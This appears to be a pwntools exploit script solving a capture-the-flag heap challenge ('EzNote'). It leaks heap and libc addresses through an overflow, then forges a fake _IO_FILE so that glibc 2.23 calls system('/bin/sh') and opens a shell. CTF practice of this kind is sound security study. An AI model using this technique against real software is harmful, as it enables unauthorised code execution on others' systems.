from pwn import *
p = process('./EzNote')
# p = remote('ctf.v50to.cc',10418)
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']
libc = ELF("/home/cc/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so")
context.log_level = "debug"

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\00'))
uu32=lambda x:u32(x.ljust(4,b'\00'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		# gdb.attach(p,x)
		gdb.attach(proc.pidof(p)[0],x)
		pause()
# p=remote()
def slog(name,address): p.success(name+'==>'+hex(address))
def add(length,content):
    p.recvuntil(b"Your choice :")
    p.sendline(b'1')
    p.recvuntil(b"Length of Note : ")
    p.sendline(str(length).encode())
    p.recvuntil(b"Content of Note:")
    p.send(content)

def show(idx):
    p.recvuntil(b"Your choice :")
    p.sendline(b'3')
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())

def edit(idx,length,content):
    p.recvuntil(b"Your choice :")
    p.sendline(b'2')
    p.recvuntil(b"Index :")
    p.sendline(str(idx).encode())
    p.recvuntil(b"Length of Note : ")
    p.sendline(str(length).encode())
    p.recvuntil(b"Content of Note : ")
    p.send(content)
ru(b'you~: ')
heap_addr=rl().strip()
heap_addr=int(heap_addr,16)
print("heap_addr",hex(heap_addr))
# pause()
add(0x10,b'aaaa') #0
# pause()
payload1=b'a'*0x10+p64(0)+p8(0xb1)+p8(0x00)+p8(0x00)+p8(0x00)
edit(0,len(payload1),payload1)
print("edited")
# pause()
add(0xb0,b'bbbb') #0
print("added")
# pause()
edit(0,0x30,b'a'*0x20)
print('a*20')
# pause()
show(0)
p.recvuntil(b'a'*0x20)
libc_addr=uu64(p.recv(6))
print("libc_addr",type(libc_addr),hex(libc_addr))
libc_base=libc_addr-0x00007fcb39486b78+0x7fcb390c3000
print('libc_base',hex(libc_base))
_IO_list_all=libc_base+libc.sym['_IO_list_all']
print('_IO_list_all',hex(_IO_list_all))
print('malloc_hook',libc_base+libc.sym['__malloc_hook'])
system_addr=libc_base+libc.sym['system']
print('system_addr',hex(system_addr))
# payload2=b'a'*0x10+p64(0)+p64(0x71)+p64(0)+p64(_IO_list_all-0x10)

fake_file=b''
fake_file+=b'/bin/sh\x00'+p64(0x61) #old top chunk prev_size & size 同时也是fake file的_flags字段
fake_file+=p64(0)+p64(_IO_list_all-0x10) #old top chunk fd & bk
fake_file+=p64(0)+p64(1)#_IO_write_base & _IO_write_ptr
fake_file+=p64(0)*7
fake_file+=p64(heap_addr+0xf40)#chain
fake_file+=p64(0)*13
fake_file+=p64(heap_addr+0x508+0xb10)
fake_file+=p64(0)+p64(0)+p64(system_addr)
payload2=b'\x00'*0x10
payload2+=fake_file
# payload2+=p64(0xdeadbeef)+p64(_IO_list_all-0x10)
# payload2 += p64(0) + p64(1)
# payload2 = payload2.ljust(0xc0, b'\x00')
# payload2 += p64(0) * 3 + p64(heap_addr + 0x5E8) + p64(0) * 2 + p64(system_addr)


# stream += p64(1)           # value of _mode      so :  fp->_mode > 0                       2

edit(0,len(payload2),payload2)
print("prepare to edit")
print('heapaddr',hex(heap_addr))
gdba()
pause()
p.recvuntil(b"Your choice :")
p.sendline(b'1')
p.recvuntil(b"Length of Note : ")
p.sendline(str(0x60).encode())
ita()
